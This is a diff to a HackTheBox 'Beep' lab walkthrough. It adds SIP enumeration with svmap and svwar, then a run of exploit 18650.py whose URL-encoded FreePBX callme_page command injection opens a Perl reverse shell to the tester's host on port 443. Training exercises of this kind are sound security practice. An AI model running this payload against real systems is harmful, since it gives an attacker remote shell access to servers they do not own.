@@ -274,6 +274,8 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 
 ### LFI and Postfix smtpd
 
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/beep)
+
 After gathering information in the server, I have 2 LFI vulnerabilities:
 
 1. Elastix 2.2.0 - 'graph.php' Local File Inclusion
@@ -359,19 +361,51 @@ uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
 bash-3.2$ 
 ```
 
-### FreePBX / Elastix RCE
+### VoIP Command Injection
+
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/beep)
 
 I used exploit `php/webapps/18650.py` found when I enum Elastix.
 
-I was drop some `sys.argv` and query the url with firefox.
+Detect VoIP system using svmap
 
-The number of extension is "233"
+```
+┌──(Hades㉿10.10.14.5)-[2.1:20.3]~/walkthrough/hackthebox/beep
+└─$ svmap 10.10.10.7
++-----------------+---------------------+-------------+
+| SIP Device      | User Agent          | Fingerprint |
++=================+=====================+=============+
+| 10.10.10.7:5060 | FPBX-2.8.1(1.8.7.0) | disabled    |
++-----------------+---------------------+-------------+
+```
+
+Find the extension in the server with `svwar`
+
++ `-m` method REGISTER (default), OPTIONS and INVITE
++ `-e` RANGE
+
+There are an authentication when I use method REGISTER, I also have no OPTIONS, I use INVITE to call in the chanel with range of extension 100-300.
+
+```
+┌──(Hades㉿10.10.14.5)-[1.3:20.3]~/walkthrough/hackthebox/beep
+└─$ svwar -m INVITE -e100-300 10.10.10.7
+<snip>
++-----------+----------------+
+| Extension | Authentication |
++===========+================+
+| 233       | reqauth        |
++-----------+----------------+
+| 229       | weird          |
++-----------+----------------+
+``` 
+
+In the exploit the extension="233", I was drop some `sys.argv` and query the url with firefox.
 
 [IppSec HackTheBox Beep](https://www.youtube.com/watch?v=XJmBpOd__N8)
 
 ```
-┌──(Hades㉿10.10.14.5)-[2.2:50.5]~/walkthrough/hackthebox/beep
-└─$ python3 18650.py 10.10.10.7 10.10.14.5 443
+┌──(Hades㉿10.10.14.5)-[1.5:21.3]~/walkthrough/hackthebox/beep
+└─$ python3 18650.py 233 10.10.10.7 10.10.14.5 443
 https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
 ```
 
@@ -389,6 +423,8 @@ bash-3.2$
 ```
 
 ### Webmin Shellshock
+
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/beep)
 
 Webmin using `session_login.cgi`, it can be exploit using shellshock payload.
 
